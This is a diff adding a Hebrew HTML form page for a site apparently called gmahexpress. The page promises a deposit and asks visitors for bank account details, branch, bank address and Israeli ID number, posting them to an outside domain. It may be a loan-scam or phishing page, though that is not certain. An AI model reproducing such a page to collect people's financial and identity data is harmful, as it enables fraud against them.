@@ -1,0 +1,160 @@
+<!DOCTYPE HTML>
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="he-il"><![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8 ie7" lang="he-il"><![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9 ie8" lang="he-il"><![endif]-->
+<!--[if gt IE 8]> <html class="no-js ie9" lang="he-il"><![endif]-->
+<html lang="he-il">
+	<head>
+		<meta charset="utf-8" />
+		<title>חשבון בנק  - gmahexpress</title>
+<meta data-body-font-family="Helvetica " data-body-font-type="system">
+	</head>
+	<body >
+	
+									
+				
+<div style="text-align:center">
+
+	<h1 class="page-subheading">החשבון בנק  שלך</h1>
+	<p class="info-title">
+			<br/> על מנת להפקיד הסכום המבוקש לחשבון שלך ,מלא הטופס למטה 
+וצרף התעודת זאות שאתה סרקתה לקובץ JPG או PGN או PDF	
+    </p>
+				
+  <p  style="text-align:center; border:thick">         
+	<p class="required"><sup>*</sup>שדה חובה</p>
+</p> 
+</div>
+<div  style="padding-left:25%" >
+<form action="https://gmach.konim.biz/he/הזמנה" method="post" class="std" id="add_address"  >	
+<table   >
+
+
+ 
+      <thead>
+                 <tr>
+                    
+                    <th>				<label for ="bank_name"  >שם הבנק<sup>*</sup></label>
+								
+                    </th>
+                      <th>				<label for="company">מס הבנק <sup>*</sup></label>  
+
+                    </th> 								
+
+                     <th>        		<label for="address1">מספר חשבון בנק <sup>*</sup></label>
+                   			  
+
+                    </th>
+                     <th>				<label for="address2"> מס הסניף <sup>*</sup></label>
+								
+
+                    </th>
+                     
+                 </tr>
+        </thead>
+<tr >
+    <td ><input   type="text" name="bank_name" id="bank_name" value=""  required  autofocus /></td>
+    <td><input type="text" id="account_number" name="account_number" pattern="[0-9]{7}" value="" required/></td>
+    <td><input  type="text" id="bank_number" name="bank_number" value="" pattern="[0-9]{3}" required /></td>
+    <td><input   type="text" id="sucursale" name="sucursale" value="" pattern="[0-9]{3}" required /></td>
+
+ </tr>
+ </table>
+ <table>
+             
+                  <tr>
+                    
+                    <th>						<label for="address1">כתובת הבנק<sup>*</sup></label>
+                    </th>
+                      <th>					<label for="postcode">מיקוד <sup>*</sup></label>
+ 
+                    </th>
+                      <th>        		<label for="city">עיר <sup>*</sup></label>
+                    </th>
+                      <th>				<label for="id_country" >ארץ</label>
+
+                    </th>
+                     
+                 </tr>
+        
+ 	       
+  <tr>
+    <td>   
+				
+					<input class="is_required validate form-control" data-validate="isAddress" type="text" id="address1" name="address1" value="" required />
+
+	</td>				
+	<td>				<input  data-validate="isPostCode" type="text" id="postcode" name="postcode" value="" />
+																																																		
+	</td>				
+	<td>				<input data-validate="isCityName" type="text" name="city" id="city" value="" pattern="[א-ת]{4}"  maxlength="64"  required />
+	</td>	
+
+<td>				
+					<input  id="id_country" readonly name="id_country" value="ישראל" />
+				
+</td>
+  </tr>
+  
+  </table>
+  <table align="center">
+
+                 <tr>
+                    
+                    <th>					<label for="phone">טלפון הבנק<sup>*</sup></label>
+
+                    </th>
+                      <th>					<label for="tz">מספר תעודת  זיהות<sup>*</sup></label> 
+  					 </th>
+                  </tr>   
+          
+  <tr>       
+ <td   style="text-align:center">     
+																																																				
+
+					
+					<input data-validate="isPhoneNumber" type="tel" id="phone" name="phone" value="" pattern="[0-9]{9}" required />
+				
+	</td>
+    <td>	
+				
+				<input  data-validate="isNumber" type="text" name="tz" id="tz" value="" pattern="[0-9]{10}" required />
+			
+	</td>			
+	
+</tr>
+ <tr >
+ 
+                  
+                      <th>        		<label for="other">מידע נוסף</label>
+                    </th>
+                  
+ </tr>  
+ <tr>
+ 	<td>		
+			<textarea data-validate="isMessage" id="other" name="other" cols="26" rows="3" ></textarea>
+	</td>
+ </tr> 
+<tr>		
+	<td>	<p class="submit2">
+			
+                          
+            <input type="hidden" name="token" value="8c7d26913c479cf0f945e2bac0fc2e3e" />
+			<button type="submit" name="submitAccount" id="submitAccount" class="btn btn-default button button-medium">
+				<span>
+					שמור
+					<i class="icon-chevron-right right"></i>
+				</span>
+			</button>
+		</p>
+       </td>
+
+  </tr> 
+  </table> 
+	</form>
+    
+  
+</div>
+
+ 
+</body></html>
